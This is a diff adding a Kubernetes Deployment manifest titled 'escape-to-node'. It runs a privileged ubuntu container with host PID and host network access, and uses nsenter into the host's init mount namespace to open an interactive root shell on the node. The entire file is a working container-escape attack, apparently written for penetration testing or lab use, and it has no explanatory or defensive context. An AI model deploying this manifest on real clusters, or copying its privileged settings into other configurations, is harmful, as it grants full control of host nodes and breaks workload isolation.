@@ -1,0 +1,24 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: escape-to-node
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app.kubernetes.io/name: escape-to-node
+  template:
+    metadata:
+      labels:
+        app.kubernetes.io/name: escape-to-node
+    spec:
+      hostPID: true
+      hostNetwork: true
+      containers:
+      - name: ubuntu
+        image: ubuntu
+        command: [nsenter,--mount=/proc/1/ns/mnt,--,/bin/bash]
+        tty: true
+        stdin: true
+        securityContext:
+          privileged: true
